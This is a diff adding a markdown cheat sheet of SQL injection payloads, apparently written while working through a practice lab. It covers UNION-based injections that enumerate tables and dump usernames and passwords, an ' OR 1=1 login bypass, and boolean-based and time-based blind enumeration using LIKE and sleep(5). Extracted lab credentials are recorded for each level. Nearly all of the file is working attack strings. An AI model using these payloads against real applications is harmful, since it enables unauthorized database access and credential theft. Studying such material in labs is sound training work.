@@ -1,0 +1,69 @@
+# In-band SQL-injection commands
+
+0' or 0" -> if it responds with a SQL error, then there is a SQL Injection Vulnerability
+0 UNION SELECT 1
+0 UNION SELECT 1,2
+
+0 UNION SELECT 1,2,3
+
+0 UNION SELECT 1,2,database()
+0 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='sqli_one'
+## => article, staff_users
+
+0 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='staff_users'
+## => id,username,password
+
+0 UNION SELECT id,username,password from sqli_one.staff_users ; => gives only one result
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') from sqli_one.staff_users
+## => LEVEL 1
+## admin:p4ssword
+## martin:pa$$word 
+## jim:work123
+##
+
+# Blind SQL-injection - Authentication By-Pass with Login Forms
+
+' OR 1=1;--
+
+##which effectively turns the SQL query as follows
+select * from users where username='' and password='' OR 1=1;
+
+# Blind SQL-injection - Boolean Based
+
+admin123' UNION SELECT 1;--
+admin123' UNION SELECT 1,2;--
+admin123' UNION SELECT 1,2,3;--
+
+## Enumerating database
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 where database() like 'sq%';--
+..
+..
+..
+admin123' UNION SELECT 1,2,3 where database() like 'sqli_three';--
+admin123' UNION SELECT 1,2,3 from information_schema.tables where table_schema='sqli_three' AND table_name like 'u%';--
+admin123' UNION SELECT 1,2,3 from information_schema.columns where table_name='users' AND column_name like 'password';--
+admin123' UNION SELECT 1,2,3 from users where username like 'a%;--
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--
+
+## => LEVEL 2
+## admin:3845
+
+
+# Blind SQL-injection - Time Based
+# if the sleep function is getting executed, then it means the query is right, otherwise its an error.
+admin123' UNION SELECT sleep(5);--
+admin123' UNION SELECT sleep(5),2;--
+admin123' UNION SELECT sleep(5),2 where database() like 'sqli_four';--
+
+admin123' UNION SELECT sleep(5),2 from information_schema.tables where table_schema='sqli_four' AND table_name like 'users%';--
+admin123' UNION SELECT sleep(5),2 from users where username='admin' and password like '1%';--
+admin123' UNION SELECT sleep(5),2 from users where username='admin' and password='4961';--
+
+## => LEVEL 3
+## admin:4961
+
+
+
+
+
